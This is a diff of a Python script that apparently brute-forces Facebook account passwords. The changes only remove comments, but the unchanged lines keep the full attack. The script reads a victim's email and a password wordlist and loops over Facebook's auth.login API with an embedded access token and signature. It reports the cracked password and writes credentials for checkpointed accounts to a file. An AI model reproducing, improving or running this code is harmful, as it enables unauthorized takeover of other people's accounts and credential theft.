@@ -35,12 +35,12 @@ banner = '''
 
 def fetch_facebook_data():
     try:
-        os.system('clear')  # Clear the screen
+        os.system('clear')  
         print(banner)
         print(internet)
         print('\033[37;1m[\x1b[92m+\033[37;1m] \033[37;1mFetching data files from facebook...')
         
-        # Simulate progress bar
+       
         toolbar_width = 25
         for _ in range(toolbar_width + 1):
             sys.stdout.write('\r')
@@ -51,21 +51,21 @@ def fetch_facebook_data():
             sys.stdout.flush()
             time.sleep(0.1)
 
-        print()  # Print a new line after progress bar completes
+        print()  
 
-        # Check internet connection by making a request to Facebook
+        
         response = requests.get('http://facebook.com')
-        response.raise_for_status()  # Raise an exception for HTTP errors
+        response.raise_for_status()  
         print('\n\033[32;1m[+] \033[37;1mloading main page... ')
         time.sleep(2.0)
     except (ConnectionError, requests.exceptions.RequestException) as e:
         print('\n\033[31;1m[!] \033[37;1mNo Connection')
-        print(e)  # Print the error message
+        print(e)  
         sys.exit()
 
 def start():
     try:
-        os.system('clear')  # Clear the screen
+        os.system('clear')  
         print(banner)
         email = input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m ID \033[36;1m| \033[37;1mEmail \033[36;1m: \033[32;1m')
         passw_file = input('\033[34;1m[\033[37;1m~\033[34;1m]\033[37;1m Get Password \033[31;1m:\033[32;1m ')
@@ -81,13 +81,12 @@ def start():
 
         password_found = False
         for pw in passwords:
-            pw = pw.strip()  # Remove leading/trailing whitespace and newline characters
+            pw = pw.strip()  
             try:
-                # Print the password being used from generate.txt
+                
                 sys.stdout.write(f'[=] Getting Password --> {pw}\r')
                 sys.stdout.flush()
 
-                # Perform login attempt using the password
                 response = requests.get(f'https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={email}&locale=en_US&password={pw}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                 data = response.json()
 
@@ -101,9 +100,9 @@ def start():
                     print('\033[32;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw)
                     print('\033[32;1m[+] \033[37;1mStatus   \033[32;1m:\033[32;1m SUCCESS')
                     password_found = True
-                    break  # Exit loop since we found the password
+                    break  
                 elif 'error_msg' in data and 'www.facebook.com' in data['error_msg']:
-                    # Password found but account is checkpointed
+                    
                     with open('successCP.txt', 'w') as f:
                         f.write('[ID]=> ' + email + '\n')
                         f.write('[PW]=> ' + pw)
@@ -112,10 +111,10 @@ def start():
                     print('\033[33;1m[+] \033[37;1mPassword \033[32;1m:\033[35;1m '+pw)
                     print('\033[33;1m[+] \033[37;1mStatus   \033[32;1m:\033[32;1m SUCCESS')
                     password_found = True
-                    break  # Exit loop since we found the password
+                    break 
             except (ConnectionError, requests.exceptions.RequestException) as e:
                 print('\033[37;1m[\033[32;1mx\033[37;1m] \033[31;1mConnection timeout or error')
-                print(e)  # Print the error message
+                print(e)  
                 sys.exit()
 
         if not password_found:
@@ -132,7 +131,7 @@ def start():
 
     except IOError as e:
         print('\033[37;1m[\033[32;1mx\033[37;1m] \033[37;1mError reading password file')
-        print(e)  # Print the error message
+        print(e)  
         sys.exit()
 
 def main():
